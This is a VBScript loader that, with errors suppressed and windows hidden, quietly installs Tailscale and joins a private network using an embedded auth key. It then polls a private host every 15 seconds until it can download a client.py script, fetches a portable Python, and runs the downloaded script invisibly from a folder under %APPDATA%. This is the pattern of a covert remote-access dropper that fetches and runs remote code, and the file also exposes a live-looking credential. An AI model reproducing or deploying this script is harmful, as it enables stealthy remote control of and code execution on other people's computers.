On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set sh = CreateObject("WScript.Shell")
ts_exe = "C:\Program Files\Tailscale\tailscale.exe"
auth_key = "tskey-auth-kVhjVK8KY821CNTRL-JLPwuMbAmsV6VsKAgynksV68F38HMYfoZ"
host_url = "http://100.81.97.109:8000"
host_ip = "100.81.97.109"

appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
dir = appdata & "\NinepeaksClient"
If Not fso.FolderExists(dir) Then fso.CreateFolder(dir)

Function Download(url, target)
    On Error Resume Next
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", url, False: x.Send
    If x.Status = 200 Then
        Set s = CreateObject("ADODB.Stream")
        s.Open: s.Type = 1: s.Write x.ResponseBody: s.SaveToFile target, 2: s.Close
        Download = True
    Else
        Download = False
    End If
End Function

' 1. Tailscale auto-provisioning
If Not fso.FileExists(ts_exe) Then
    tmp_ts = sh.ExpandEnvironmentStrings("%TEMP%") & "\ts.exe"
    Download "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe", tmp_ts
    sh.Run """" & tmp_ts & """ /quiet /norestart", 0, True
End If
sh.Run """" & ts_exe & """ up --authkey=" & auth_key & " --accept-routes --reset", 0, True

' 2. INFINITE WAIT FOR HOST
Do
    If sh.Run("ping -n 1 " & host_ip, 0, True) = 0 Then
        Randomize: rts = CStr(Fix(Timer * 1000))
        If Download(host_url & "/client.py?t=" & rts, dir & "\client.py") Then Exit Do
    End If
    WScript.Sleep 15000 ' Check every 15s
Loop

' 3. Portable Python
py_dir = dir & "\python"
py_exe = py_dir & "\pythonw.exe"
If Not fso.FileExists(py_exe) Then
    zip = dir & "\py.zip"
    Do
        If Download("https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip", zip) Then Exit Do
        WScript.Sleep 30000
    Loop
    If Not fso.FolderExists(py_dir) Then fso.CreateFolder(py_dir)
    Set sa = CreateObject("Shell.Application")
    sa.NameSpace(py_dir).CopyHere sa.NameSpace(zip).Items(), 16
    WScript.Sleep 5000: fso.DeleteFile zip
    Set ts = fso.OpenTextFile(py_dir & "\python311._pth", 8, True)
    ts.WriteLine "import site": ts.Close
End If

' 4. Final Run
sh.Run """" & py_exe & """ """ & dir & "\client.py""", 0, False
